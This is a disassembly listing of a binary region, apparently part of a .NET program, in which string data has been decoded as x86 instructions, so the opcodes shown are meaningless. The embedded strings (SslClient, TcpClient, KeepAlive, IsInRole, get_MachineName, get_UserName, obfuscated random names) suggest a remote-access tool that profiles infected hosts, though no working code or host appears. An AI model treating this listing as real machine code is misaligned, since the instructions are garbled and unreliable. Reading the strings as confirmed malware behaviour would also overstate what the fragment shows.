  407f3a:	61                   	popa
  407f3b:	71 4b                	jno    0x407f88
  407f3d:	61                   	popa
  407f3e:	00 47 4d             	add    %al,0x4d(%edi)
  407f41:	63 6e 6d             	arpl   %ebp,0x6d(%esi)
  407f44:	4f                   	dec    %edi
  407f45:	4b                   	dec    %ebx
  407f46:	5a                   	pop    %edx
  407f47:	56                   	push   %esi
  407f48:	61                   	popa
  407f49:	4e                   	dec    %esi
  407f4a:	61                   	popa
  407f4b:	00 55 50             	add    %dl,0x50(%ebp)
  407f4e:	75 55                	jne    0x407fa5
  407f50:	66 46                	inc    %si
  407f52:	54                   	push   %esp
  407f53:	42                   	inc    %edx
  407f54:	54                   	push   %esp
  407f55:	52                   	push   %edx
  407f56:	61                   	popa
  407f57:	00 72 4f             	add    %dh,0x4f(%edx)
  407f5a:	43                   	inc    %ebx
  407f5b:	50                   	push   %eax
  407f5c:	71 46                	jno    0x407fa4
  407f5e:	7a 6e                	jp     0x407fce
  407f60:	76 6b                	jbe    0x407fcd
  407f62:	52                   	push   %edx
  407f63:	61                   	popa
  407f64:	00 48 48             	add    %cl,0x48(%eax)
  407f67:	47                   	inc    %edi
  407f68:	54                   	push   %esp
  407f69:	68 75 4b 65 56       	push   $0x56654b75
  407f6e:	78 61                	js     0x407fd1
  407f70:	00 63 59             	add    %ah,0x59(%ebx)
  407f73:	50                   	push   %eax
  407f74:	4a                   	dec    %edx
  407f75:	43                   	inc    %ebx
  407f76:	75 64                	jne    0x407fdc
  407f78:	43                   	inc    %ebx
  407f79:	7a 45                	jp     0x407fc0
  407f7b:	42                   	inc    %edx
  407f7c:	62 00                	bound  %eax,(%eax)
  407f7e:	59                   	pop    %ecx
  407f7f:	64 41                	fs inc %ecx
  407f81:	7a 78                	jp     0x407ffb
  407f83:	79 6c                	jns    0x407ff1
  407f85:	47                   	inc    %edi
  407f86:	4d                   	dec    %ebp
  407f87:	6d                   	insl   (%dx),%es:(%edi)
  407f88:	63 4e 62             	arpl   %ecx,0x62(%esi)
  407f8b:	00 42 43             	add    %al,0x43(%edx)
  407f8e:	45                   	inc    %ebp
  407f8f:	52                   	push   %edx
  407f90:	5a                   	pop    %edx
  407f91:	62 4f 4b             	bound  %ecx,0x4b(%edi)
  407f94:	52                   	push   %edx
  407f95:	62 00                	bound  %eax,(%eax)
  407f97:	45                   	inc    %ebp
  407f98:	4f                   	dec    %edi
  407f99:	71 57                	jno    0x407ff2
  407f9b:	79 4e                	jns    0x407feb
  407f9d:	57                   	push   %edi
  407f9e:	64 4f                	fs dec %edi
  407fa0:	6c                   	insb   (%dx),%es:(%edi)
  407fa1:	7a 52                	jp     0x407ff5
  407fa3:	62 00                	bound  %eax,(%eax)
  407fa5:	6d                   	insl   (%dx),%es:(%edi)
  407fa6:	73 63                	jae    0x40800b
  407fa8:	6f                   	outsl  %ds:(%esi),(%dx)
  407fa9:	72 6c                	jb     0x408017
  407fab:	69 62 00 4b 4f 4b 6f 	imul   $0x6f4b4f4b,0x0(%edx),%esp
  407fb2:	65 4c                	gs dec %esp
  407fb4:	61                   	popa
  407fb5:	74 7a                	je     0x408031
  407fb7:	6d                   	insl   (%dx),%es:(%edi)
  407fb8:	58                   	pop    %eax
  407fb9:	6c                   	insb   (%dx),%es:(%edi)
  407fba:	6c                   	insb   (%dx),%es:(%edi)
  407fbb:	62 00                	bound  %eax,(%eax)
  407fbd:	64 47                	fs inc %edi
  407fbf:	43                   	inc    %ebx
  407fc0:	4b                   	dec    %ebx
  407fc1:	50                   	push   %eax
  407fc2:	43                   	inc    %ebx
  407fc3:	4f                   	dec    %edi
  407fc4:	61                   	popa
  407fc5:	58                   	pop    %eax
  407fc6:	41                   	inc    %ecx
  407fc7:	49                   	dec    %ecx
  407fc8:	76 71                	jbe    0x40803b
  407fca:	62 00                	bound  %eax,(%eax)
  407fcc:	53                   	push   %ebx
  407fcd:	74 75                	je     0x408044
  407fcf:	62 00                	bound  %eax,(%eax)
  407fd1:	6c                   	insb   (%dx),%es:(%edi)
  407fd2:	53                   	push   %ebx
  407fd3:	42                   	inc    %edx
  407fd4:	4b                   	dec    %ebx
  407fd5:	6e                   	outsb  %ds:(%esi),(%dx)
  407fd6:	6a 4d                	push   $0x4d
  407fd8:	6d                   	insl   (%dx),%es:(%edi)
  407fd9:	54                   	push   %esp
  407fda:	54                   	push   %esp
  407fdb:	78 53                	js     0x408030
  407fdd:	76 62                	jbe    0x408041
  407fdf:	00 72 77             	add    %dh,0x77(%edx)
  407fe2:	4a                   	dec    %edx
  407fe3:	67 75 58             	addr16 jne 0x40803e
  407fe6:	5a                   	pop    %edx
  407fe7:	67 4a                	addr16 dec %edx
  407fe9:	6f                   	outsl  %ds:(%esi),(%dx)
  407fea:	72 7a                	jb     0x408066
  407fec:	62 00                	bound  %eax,(%eax)
  407fee:	54                   	push   %esp
  407fef:	4a                   	dec    %edx
  407ff0:	6f                   	outsl  %ds:(%esi),(%dx)
  407ff1:	77 53                	ja     0x408046
  407ff3:	61                   	popa
  407ff4:	6d                   	insl   (%dx),%es:(%edi)
  407ff5:	72 79                	jb     0x408070
  407ff7:	46                   	inc    %esi
  407ff8:	70 78                	jo     0x408072
  407ffa:	49                   	dec    %ecx
  407ffb:	43                   	inc    %ebx
  407ffc:	63 00                	arpl   %eax,(%eax)
  407ffe:	6c                   	insb   (%dx),%es:(%edi)
  407fff:	6f                   	outsl  %ds:(%esi),(%dx)
  408000:	4a                   	dec    %edx
  408001:	76 6e                	jbe    0x408071
  408003:	73 42                	jae    0x408047
  408005:	4c                   	dec    %esp
  408006:	4a                   	dec    %edx
  408007:	44                   	inc    %esp
  408008:	63 00                	arpl   %eax,(%eax)
  40800a:	78 66                	js     0x408072
  40800c:	73 52                	jae    0x408060
  40800e:	54                   	push   %esp
  40800f:	74 7a                	je     0x40808b
  408011:	63 4d 4e             	arpl   %ecx,0x4e(%ebp)
  408014:	63 00                	arpl   %eax,(%eax)
  408016:	64 51                	fs push %ecx
  408018:	71 67                	jno    0x408081
  40801a:	71 78                	jno    0x408094
  40801c:	50                   	push   %eax
  40801d:	66 4a                	dec    %dx
  40801f:	6c                   	insb   (%dx),%es:(%edi)
  408020:	45                   	inc    %ebp
  408021:	66 56                	push   %si
  408023:	63 00                	arpl   %eax,(%eax)
  408025:	53                   	push   %ebx
  408026:	79 73                	jns    0x40809b
  408028:	74 65                	je     0x40808f
  40802a:	6d                   	insl   (%dx),%es:(%edi)
  40802b:	2e 43                	cs inc %ebx
  40802d:	6f                   	outsl  %ds:(%esi),(%dx)
  40802e:	6c                   	insb   (%dx),%es:(%edi)
  40802f:	6c                   	insb   (%dx),%es:(%edi)
  408030:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408035:	6e                   	outsb  %ds:(%esi),(%dx)
  408036:	73 2e                	jae    0x408066
  408038:	47                   	inc    %edi
  408039:	65 6e                	outsb  %gs:(%esi),(%dx)
  40803b:	65 72 69             	gs jb  0x4080a7
  40803e:	63 00                	arpl   %eax,(%eax)
  408040:	4d                   	dec    %ebp
  408041:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408048:	74 2e                	je     0x408078
  40804a:	56                   	push   %esi
  40804b:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  408052:	73 69                	jae    0x4080bd
  408054:	63 00                	arpl   %eax,(%eax)
  408056:	67 65 74 5f          	addr16 gs je 0x4080b9
  40805a:	53                   	push   %ebx
  40805b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40805d:	64 53                	fs push %ebx
  40805f:	79 6e                	jns    0x4080cf
  408061:	63 00                	arpl   %eax,(%eax)
  408063:	42                   	inc    %edx
  408064:	6d                   	insl   (%dx),%es:(%edi)
  408065:	61                   	popa
  408066:	43                   	inc    %ebx
  408067:	6c                   	insb   (%dx),%es:(%edi)
  408068:	57                   	push   %edi
  408069:	77 57                	ja     0x4080c2
  40806b:	78 51                	js     0x4080be
  40806d:	63 70 63             	arpl   %esi,0x63(%eax)
  408070:	00 74 75 6d          	add    %dh,0x6d(%ebp,%esi,2)
  408074:	64 74 4d             	fs je  0x4080c4
  408077:	6b 59 65 78          	imul   $0x78,0x65(%ecx),%ebx
  40807b:	41                   	inc    %ecx
  40807c:	72 63                	jb     0x4080e1
  40807e:	00 4b 4e             	add    %cl,0x4e(%ebx)
  408081:	4f                   	dec    %edi
  408082:	70 63                	jo     0x4080e7
  408084:	49                   	dec    %ecx
  408085:	48                   	dec    %eax
  408086:	68 6b 45 52 47       	push   $0x4752456b
  40808b:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  40808f:	74 5f                	je     0x4080f0
  408091:	49                   	dec    %ecx
  408092:	64 00 4e 44          	add    %cl,%fs:0x44(%esi)
  408096:	53                   	push   %ebx
  408097:	55                   	push   %ebp
  408098:	57                   	push   %edi
  408099:	79 42                	jns    0x4080dd
  40809b:	4b                   	dec    %ebx
  40809c:	59                   	pop    %ecx
  40809d:	50                   	push   %eax
  40809e:	64 00 51 73          	add    %dl,%fs:0x73(%ecx)
  4080a2:	67 55                	addr16 push %ebp
  4080a4:	4b                   	dec    %ebx
  4080a5:	4d                   	dec    %ebp
  4080a6:	73 61                	jae    0x408109
  4080a8:	56                   	push   %esi
  4080a9:	66 5a                	pop    %dx
  4080ab:	53                   	push   %ebx
  4080ac:	52                   	push   %edx
  4080ad:	64 00 67 4f          	add    %ah,%fs:0x4f(%edi)
  4080b1:	67 74 65             	addr16 je 0x408119
  4080b4:	74 6f                	je     0x408125
  4080b6:	7a 4e                	jp     0x408106
  4080b8:	78 6c                	js     0x408126
  4080ba:	54                   	push   %esp
  4080bb:	64 00 75 48          	add    %dh,%fs:0x48(%ebp)
  4080bf:	65 65 77 63          	gs gs ja 0x408126
  4080c3:	59                   	pop    %ecx
  4080c4:	58                   	pop    %eax
  4080c5:	56                   	push   %esi
  4080c6:	64 00 45 6e          	add    %al,%fs:0x6e(%ebp)
  4080ca:	64 52                	fs push %edx
  4080cc:	65 61                	gs popa
  4080ce:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  4080d2:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  4080d9:	00 
  4080da:	54                   	push   %esp
  4080db:	68 72 65 61 64       	push   $0x64616572
  4080e0:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  4080e4:	64 00 41 64          	add    %al,%fs:0x64(%ecx)
  4080e8:	64 00 53 48          	add    %dl,%fs:0x48(%ebx)
  4080ec:	41                   	inc    %ecx
  4080ed:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  4080f3:	61                   	popa
  4080f4:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  4080fa:	74 5f                	je     0x40815b
  4080fc:	43                   	inc    %ebx
  4080fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4080fe:	6e                   	outsb  %ds:(%esi),(%dx)
  4080ff:	6e                   	outsb  %ds:(%esi),(%dx)
  408100:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  408105:	00 67 65             	add    %ah,0x65(%edi)
  408108:	74 5f                	je     0x408169
  40810a:	49                   	dec    %ecx
  40810b:	73 43                	jae    0x408150
  40810d:	6f                   	outsl  %ds:(%esi),(%dx)
  40810e:	6e                   	outsb  %ds:(%esi),(%dx)
  40810f:	6e                   	outsb  %ds:(%esi),(%dx)
  408110:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  408115:	00 73 65             	add    %dh,0x65(%ebx)
  408118:	74 5f                	je     0x408179
  40811a:	49                   	dec    %ecx
  40811b:	73 43                	jae    0x408160
  40811d:	6f                   	outsl  %ds:(%esi),(%dx)
  40811e:	6e                   	outsb  %ds:(%esi),(%dx)
  40811f:	6e                   	outsb  %ds:(%esi),(%dx)
  408120:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  408125:	00 78 63             	add    %bh,0x63(%eax)
  408128:	70 61                	jo     0x40818b
  40812a:	73 69                	jae    0x408195
  40812c:	72 63                	jb     0x408191
  40812e:	59                   	pop    %ecx
  40812f:	64 79 67             	fs jns 0x408199
  408132:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  408136:	74 5f                	je     0x408197
  408138:	47                   	inc    %edi
  408139:	75 69                	jne    0x4081a4
  40813b:	64 00 3c 53          	add    %bh,%fs:(%ebx,%edx,2)
  40813f:	65 6e                	outsb  %gs:(%esi),(%dx)
  408141:	64 53                	fs push %ebx
  408143:	79 6e                	jns    0x4081b3
  408145:	63 3e                	arpl   %edi,(%esi)
  408147:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  40814b:	61                   	popa
  40814c:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40814f:	6e                   	outsb  %ds:(%esi),(%dx)
  408150:	67 46                	addr16 inc %esi
  408152:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  408159:	73 43                	jae    0x40819e
  40815b:	6f                   	outsl  %ds:(%esi),(%dx)
  40815c:	6e                   	outsb  %ds:(%esi),(%dx)
  40815d:	6e                   	outsb  %ds:(%esi),(%dx)
  40815e:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  408163:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  408168:	61                   	popa
  408169:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40816c:	6e                   	outsb  %ds:(%esi),(%dx)
  40816d:	67 46                	addr16 inc %esi
  40816f:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  408176:	65 65 70 41          	gs gs jo 0x4081bb
  40817a:	6c                   	insb   (%dx),%es:(%edi)
  40817b:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  408182:	42                   	inc    %edx
  408183:	61                   	popa
  408184:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408187:	6e                   	outsb  %ds:(%esi),(%dx)
  408188:	67 46                	addr16 inc %esi
  40818a:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  408191:	65 61                	gs popa
  408193:	64 65 72 53          	fs gs jb 0x4081ea
  408197:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  40819e:	42                   	inc    %edx
  40819f:	61                   	popa
  4081a0:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4081a3:	6e                   	outsb  %ds:(%esi),(%dx)
  4081a4:	67 46                	addr16 inc %esi
  4081a6:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  4081ad:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  4081b4:	42                   	inc    %edx
  4081b5:	61                   	popa
  4081b6:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4081b9:	6e                   	outsb  %ds:(%esi),(%dx)
  4081ba:	67 46                	addr16 inc %esi
  4081bc:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  4081c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4081c4:	74 65                	je     0x40822b
  4081c6:	72 76                	jb     0x40823e
  4081c8:	61                   	popa
  4081c9:	6c                   	insb   (%dx),%es:(%edi)
  4081ca:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  4081cf:	61                   	popa
  4081d0:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4081d3:	6e                   	outsb  %ds:(%esi),(%dx)
  4081d4:	67 46                	addr16 inc %esi
  4081d6:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  4081dd:	75 66                	jne    0x408245
  4081df:	66 65 72 3e          	data16 gs jb 0x408221
  4081e3:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  4081e7:	61                   	popa
  4081e8:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4081eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4081ec:	67 46                	addr16 inc %esi
  4081ee:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  4081f5:	66 66 73 65          	data16 data16 jae 0x40825e
  4081f9:	74 3e                	je     0x408239
  4081fb:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  4081ff:	61                   	popa
  408200:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408203:	6e                   	outsb  %ds:(%esi),(%dx)
  408204:	67 46                	addr16 inc %esi
  408206:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  40820d:	73 6c                	jae    0x40827b
  40820f:	43                   	inc    %ebx
  408210:	6c                   	insb   (%dx),%es:(%edi)
  408211:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  408218:	5f                   	pop    %edi
  408219:	42                   	inc    %edx
  40821a:	61                   	popa
  40821b:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40821e:	6e                   	outsb  %ds:(%esi),(%dx)
  40821f:	67 46                	addr16 inc %esi
  408221:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  408228:	63 70 43             	arpl   %esi,0x43(%eax)
  40822b:	6c                   	insb   (%dx),%es:(%edi)
  40822c:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  408233:	5f                   	pop    %edi
  408234:	42                   	inc    %edx
  408235:	61                   	popa
  408236:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408239:	6e                   	outsb  %ds:(%esi),(%dx)
  40823a:	67 46                	addr16 inc %esi
  40823c:	69 65 6c 64 00 41 70 	imul   $0x70410064,0x6c(%ebp),%esp
  408243:	70 65                	jo     0x4082aa
  408245:	6e                   	outsb  %ds:(%esi),(%dx)
  408246:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  40824a:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  408251:	61 
  408252:	6c                   	insb   (%dx),%es:(%edi)
  408253:	75 65                	jne    0x4082ba
  408255:	4b                   	dec    %ebx
  408256:	69 6e 64 00 53 6e 41 	imul   $0x416e5300,0x64(%esi),%ebp
  40825d:	64 7a 62             	fs jp  0x4082c2
  408260:	70 47                	jo     0x4082a9
  408262:	51                   	push   %ecx
  408263:	57                   	push   %edi
  408264:	4c                   	dec    %esp
  408265:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  408269:	70 6c                	jo     0x4082d7
  40826b:	61                   	popa
  40826c:	63 65 00             	arpl   %esp,0x0(%ebp)
  40826f:	43                   	inc    %ebx
  408270:	72 65                	jb     0x4082d7
  408272:	61                   	popa
  408273:	74 65                	je     0x4082da
  408275:	49                   	dec    %ecx
  408276:	6e                   	outsb  %ds:(%esi),(%dx)
  408277:	73 74                	jae    0x4082ed
  408279:	61                   	popa
  40827a:	6e                   	outsb  %ds:(%esi),(%dx)
  40827b:	63 65 00             	arpl   %esp,0x0(%ebp)
  40827e:	73 65                	jae    0x4082e5
  408280:	74 5f                	je     0x4082e1
  408282:	4d                   	dec    %ebp
  408283:	6f                   	outsl  %ds:(%esi),(%dx)
  408284:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  408289:	6c                   	insb   (%dx),%es:(%edi)
  40828a:	65 4d                	gs dec %ebp
  40828c:	6f                   	outsl  %ds:(%esi),(%dx)
  40828d:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  408292:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  408299:	64 65 
  40829b:	00 45 6e             	add    %al,0x6e(%ebp)
  40829e:	74 65                	je     0x408305
  4082a0:	72 44                	jb     0x4082e6
  4082a2:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  4082a6:	4d                   	dec    %ebp
  4082a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4082a8:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  4082ad:	79 70                	jns    0x40831f
  4082af:	74 6f                	je     0x408320
  4082b1:	53                   	push   %ebx
  4082b2:	74 72                	je     0x408326
  4082b4:	65 61                	gs popa
  4082b6:	6d                   	insl   (%dx),%es:(%edi)
  4082b7:	4d                   	dec    %ebp
  4082b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4082b9:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  4082be:	6d                   	insl   (%dx),%es:(%edi)
  4082bf:	70 72                	jo     0x408333
  4082c1:	65 73 73             	gs jae 0x408337
  4082c4:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  4082cb:	00 43 69             	add    %al,0x69(%ebx)
  4082ce:	70 68                	jo     0x408338
  4082d0:	65 72 4d             	gs jb  0x408320
  4082d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4082d4:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  4082d9:	6c                   	insb   (%dx),%es:(%edi)
  4082da:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  4082df:	64 65 00 44 65 6c    	fs add %al,%gs:0x6c(%ebp,%eiz,2)
  4082e5:	65 74 65             	gs je  0x40834d
  4082e8:	53                   	push   %ebx
  4082e9:	75 62                	jne    0x40834d
  4082eb:	4b                   	dec    %ebx
  4082ec:	65 79 54             	gs jns 0x408343
  4082ef:	72 65                	jb     0x408356
  4082f1:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4082f5:	74 5f                	je     0x408356
  4082f7:	4d                   	dec    %ebp
  4082f8:	65 73 73             	gs jae 0x40836e
  4082fb:	61                   	popa
  4082fc:	67 65 00 49 6e       	add    %cl,%gs:0x6e(%bx,%di)
  408301:	76 6f                	jbe    0x408372
  408303:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  408307:	45                   	inc    %ebp
  408308:	6e                   	outsb  %ds:(%esi),(%dx)
  408309:	75 6d                	jne    0x408378
  40830b:	65 72 61             	gs jb  0x40836f
  40830e:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  408312:	49                   	dec    %ecx
  408313:	44                   	inc    %esp
  408314:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  40831b:	6c                   	insb   (%dx),%es:(%edi)
  40831c:	65 00 54 6f 44       	add    %dl,%gs:0x44(%edi,%ebp,2)
  408321:	6f                   	outsl  %ds:(%esi),(%dx)
  408322:	75 62                	jne    0x408386
  408324:	6c                   	insb   (%dx),%es:(%edi)
  408325:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408329:	74 5f                	je     0x40838a
  40832b:	48                   	dec    %eax
  40832c:	61                   	popa
  40832d:	6e                   	outsb  %ds:(%esi),(%dx)
  40832e:	64 6c                	fs insb (%dx),%es:(%edi)
  408330:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408334:	6e                   	outsb  %ds:(%esi),(%dx)
  408335:	74 69                	je     0x4083a0
  408337:	6d                   	insl   (%dx),%es:(%edi)
  408338:	65 46                	gs inc %esi
  40833a:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  408341:	64 6c                	fs insb (%dx),%es:(%edi)
  408343:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408347:	74 4d                	je     0x408396
  408349:	6f                   	outsl  %ds:(%esi),(%dx)
  40834a:	64 75 6c             	fs jne 0x4083b9
  40834d:	65 48                	gs dec %eax
  40834f:	61                   	popa
  408350:	6e                   	outsb  %ds:(%esi),(%dx)
  408351:	64 6c                	fs insb (%dx),%es:(%edi)
  408353:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408357:	6e                   	outsb  %ds:(%esi),(%dx)
  408358:	74 69                	je     0x4083c3
  40835a:	6d                   	insl   (%dx),%es:(%edi)
  40835b:	65 54                	gs push %esp
  40835d:	79 70                	jns    0x4083cf
  40835f:	65 48                	gs dec %eax
  408361:	61                   	popa
  408362:	6e                   	outsb  %ds:(%esi),(%dx)
  408363:	64 6c                	fs insb (%dx),%es:(%edi)
  408365:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408369:	74 54                	je     0x4083bf
  40836b:	79 70                	jns    0x4083dd
  40836d:	65 46                	gs inc %esi
  40836f:	72 6f                	jb     0x4083e0
  408371:	6d                   	insl   (%dx),%es:(%edi)
  408372:	48                   	dec    %eax
  408373:	61                   	popa
  408374:	6e                   	outsb  %ds:(%esi),(%dx)
  408375:	64 6c                	fs insb (%dx),%es:(%edi)
  408377:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  40837b:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  408382:	65 
  408383:	00 54 6f 53          	add    %dl,0x53(%edi,%ebp,2)
  408387:	69 6e 67 6c 65 00 46 	imul   $0x4600656c,0x67(%esi),%ebp
  40838e:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  408395:	6e 
  408396:	52                   	push   %edx
  408397:	6f                   	outsl  %ds:(%esi),(%dx)
  408398:	6c                   	insb   (%dx),%es:(%edi)
  408399:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  40839d:	6e                   	outsb  %ds:(%esi),(%dx)
  40839e:	64 6f                	outsl  %fs:(%esi),(%dx)
  4083a0:	77 73                	ja     0x408415
  4083a2:	42                   	inc    %edx
  4083a3:	75 69                	jne    0x40840e
  4083a5:	6c                   	insb   (%dx),%es:(%edi)
  4083a6:	74 49                	je     0x4083f1
  4083a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4083a9:	52                   	push   %edx
  4083aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4083ab:	6c                   	insb   (%dx),%es:(%edi)
  4083ac:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4083b0:	74 5f                	je     0x408411
  4083b2:	4d                   	dec    %ebp
  4083b3:	61                   	popa
  4083b4:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  4083bb:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  4083bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4083c0:	63 65 73             	arpl   %esp,0x73(%ebp)
  4083c3:	73 4d                	jae    0x408412
  4083c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4083c6:	64 75 6c             	fs jne 0x408435
  4083c9:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4083cd:	74 5f                	je     0x40842e
  4083cf:	57                   	push   %edi
  4083d0:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  4083d7:	79 6c                	jns    0x408445
  4083d9:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  4083dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4083de:	63 65 73             	arpl   %esp,0x73(%ebp)
  4083e1:	73 57                	jae    0x40843a
  4083e3:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  4083ea:	79 6c                	jns    0x408458
  4083ec:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4083f0:	74 5f                	je     0x408451
  4083f2:	46                   	inc    %esi
  4083f3:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4083fa:	00 
  4083fb:	73 65                	jae    0x408462
  4083fd:	74 5f                	je     0x40845e
  4083ff:	46                   	inc    %esi
  408400:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  408407:	00 
  408408:	47                   	inc    %edi
  408409:	65 74 54             	gs je  0x408460
  40840c:	65 6d                	gs insl (%dx),%es:(%edi)
  40840e:	70 46                	jo     0x408456
  408410:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  408417:	00 
  408418:	47                   	inc    %edi
  408419:	65 74 46             	gs je  0x408462
  40841c:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  408423:	00 
  408424:	67 65 74 5f          	addr16 gs je 0x408487
  408428:	4d                   	dec    %ebp
  408429:	61                   	popa
  40842a:	63 68 69             	arpl   %ebp,0x69(%eax)
  40842d:	6e                   	outsb  %ds:(%esi),(%dx)
  40842e:	65 4e                	gs dec %esi
  408430:	61                   	popa
  408431:	6d                   	insl   (%dx),%es:(%edi)
  408432:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408436:	74 5f                	je     0x408497
  408438:	4f                   	dec    %edi
  408439:	53                   	push   %ebx
  40843a:	46                   	inc    %esi
  40843b:	75 6c                	jne    0x4084a9
  40843d:	6c                   	insb   (%dx),%es:(%edi)
  40843e:	4e                   	dec    %esi
  40843f:	61                   	popa
  408440:	6d                   	insl   (%dx),%es:(%edi)
  408441:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408445:	74 5f                	je     0x4084a6
  408447:	46                   	inc    %esi
  408448:	75 6c                	jne    0x4084b6
  40844a:	6c                   	insb   (%dx),%es:(%edi)
  40844b:	4e                   	dec    %esi
  40844c:	61                   	popa
  40844d:	6d                   	insl   (%dx),%es:(%edi)
  40844e:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408452:	74 5f                	je     0x4084b3
  408454:	55                   	push   %ebp
  408455:	73 65                	jae    0x4084bc
  408457:	72 4e                	jb     0x4084a7
  408459:	61                   	popa
  40845a:	6d                   	insl   (%dx),%es:(%edi)
